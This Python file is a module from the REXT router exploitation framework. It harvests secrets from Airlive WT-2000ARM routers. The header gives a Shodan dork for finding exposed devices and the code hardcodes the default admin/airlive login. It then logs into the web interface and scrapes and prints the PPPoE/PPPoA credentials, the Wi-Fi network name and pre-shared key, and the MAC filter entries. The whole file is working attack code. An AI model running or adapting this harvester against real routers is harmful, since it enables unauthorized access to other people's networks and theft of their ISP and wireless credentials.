# Name:Airlive WT-2000ARM information harvester module
# File:WT2000ARM.py
# Author:Ján Trenčanský
# License: GNU GPL v3
# Created: 29.8.2013
# Last modified: 24.12.2016
# Shodan Dork: WWW-Authenticate: Basic realm="AirLive WT-2000ARM
# Description: Module will fetch PPPoE/PPPoA credentials and WLAN credentials also MAC address filter values
# First module of REXT ever


import requests
import requests.exceptions
import bs4
import core.Harvester
from interface.messages import print_success, print_error, print_info, print_help
import interface.utils


class Harvester(core.Harvester.RextHarvester):
    """
Name:Airlive WT-2000ARM information harvester module
File:WT2000ARM.py
Author:Ján Trenčanský
License: GNU GPL v3
Created: 29.8.2013
Description: Module will fetch PPPoE/PPPoA credentials and WLAN credentials also MAC address filter values

Options:
    Name        Description

    host        Target host address
    port        Target port
    username    Target username
    password    Target password
    """

    username = 'admin'
    password = 'airlive'

    def __init__(self):
        core.Harvester.RextHarvester.__init__(self)

    def do_set(self, e):
        args = e.split(' ')
        try:
            if args[0] == "host":
                if interface.utils.validate_ipv4(args[1]):
                    self.host = args[1]
                else:
                    print_error("please provide valid IPv4 address")
            elif args[0] == "port":
                if str.isdigit(args[1]):
                    self.port = args[1]
                else:
                    print_error("port value must be integer")
            elif args[0] == "username":
                self.username = args[1]
            elif args[0] == "password":
                self.password = args[1]
        except IndexError:
            print_error("please specify value for variable")

    def do_password(self, e):
        print_info(self.password)

    def help_password(self):
        print_help("Prints current value of password")

    def help_username(self):
        print_info("Prints current value of username")

    def do_username(self, e):
        print_info(self.username)

    def do_run(self, e):
        try:
            print_info("Connecting to:", self.host)
            auth = (self.username, self.password)
            response = requests.get("http://"+self.host+"/basic/home_wan.htm", auth=auth, timeout=60)
            # headers, body = http.request("http://"+self.target+"/basic/home_wan.htm")
            if response.status_code == 200:
                print_success("Authentication successful")
                ppp_credentials = self.fetch_ppp(response.text)
                print_success("PPPoE/PPPoA Username:", ppp_credentials[0])
                print_success("PPPoE/PPPoA Password", ppp_credentials[1])
                response = requests.get("http://"+self.host+"/basic/home_wlan.htm", auth=auth, timeout=60)
                if response.status_code == 200:
                    wlan_credentials = self.fetch_wlan(response.text)
                    print_success("ESSID:", wlan_credentials[0])
                    print_success("PSK:", wlan_credentials[1])
                    for mac in wlan_credentials[2]:
                        print_success("MAC filter:", mac)
                else:
                    print_error("Status code:", response.status_code)
            elif response.status_code == 401:
                print_error("401 Authentication failed")
            elif response.status_code == 404:
                print_error("404 Page does not exists")
            else:
                print_error("Status code:", response.status_code)
        except requests.exceptions.Timeout:
            print_error("Timeout!")
        except requests.exceptions.ConnectionError:
            print_error("No route to host")
            
    def fetch_ppp(self, body):
        wan_page_soap = bs4.BeautifulSoup(body, 'html.parser')
        inputs = wan_page_soap.find_all("input")
        ppp_username = ""
        ppp_password = ""
        for i in inputs:
            if i['name'] == "wan_PPPUsername":
                ppp_username = i['value']
            elif i['name'] == "wan_PPPPassword":
                ppp_password = i['value']
        return ppp_username, ppp_password

    def fetch_wlan(self, body):
        wan_page_soap = bs4.BeautifulSoup(body, 'html.parser')
        inputs = wan_page_soap.find_all("input")
        essid = ""
        wlan_psk = None
        mac_filter_list = []
        for i in inputs:
            if i['name'] == "ESSID":
                essid = i['value']
            elif i['name'] == "PreSharedKey":
                wlan_psk = i['value']
            elif i['name'] == "WLANFLT_MAC":
                mac_filter_list.append(i['value'])
        return essid, wlan_psk, mac_filter_list

Harvester()
